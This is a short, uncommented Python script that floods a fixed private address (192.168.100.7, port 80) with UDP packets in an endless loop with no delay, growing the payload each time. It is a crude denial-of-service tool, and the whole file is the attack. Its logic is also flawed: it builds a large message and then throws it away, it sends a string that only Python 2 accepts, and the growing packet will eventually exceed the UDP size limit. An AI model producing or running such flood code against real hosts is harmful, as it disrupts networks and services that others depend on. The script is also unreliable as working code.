import socket

UDP_IP   = '192.168.100.7'
UDP_PORT = 80

message = ''
for i in range(0, 65507):
	message += 'a'

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

message = ''
while True:
	s.sendto(message, (UDP_IP, UDP_PORT))
	for i in range(0, 1):
		message += 'a'
